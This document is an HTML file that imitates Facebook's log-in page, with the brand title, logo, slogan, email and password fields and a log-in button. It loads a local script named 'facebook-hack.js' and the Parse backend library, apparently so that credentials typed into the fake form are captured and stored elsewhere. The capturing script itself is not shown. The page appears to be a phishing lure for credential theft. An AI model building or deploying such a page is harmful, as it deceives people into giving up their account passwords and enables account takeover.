<!DOCTYPE html>
<html>
  <head>
    <title>Facebook -log in or sign up</title>
    <link rel="stylesheet" href="facebook.css">
  </head>

  <body>
    <div class="facebook-logo-slogan">
      <img class="facebook-logo" src="facebook-logo.svg">
      <div class="facebook-slogan">
        Connect with friends and the world around you on Facebook.
      </div>
    </div>

    <div>
      <div class="signin-menu">
        <input class="input-box-email js-input-box-email" type="text" placeholder="Email or phone number">
        <input class="input-box-password js-input-box-password" type="password" placeholder="Password">
        <button class="login-button js-login-button">Log In</button>
        <div class="forgot-password">Forgot password?</div>
        <input class="line">
        <button class="create-new-account">Create new account</button>
      </div>
      <div class="create-page"><strong>Create a Page </strong> a Page for a celebrity, brand or business.</div>
    </div>
    <script type="module" src="facebook-hack.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/parse/2.19.0/parse.min.js"></script>
  </body>
</html>
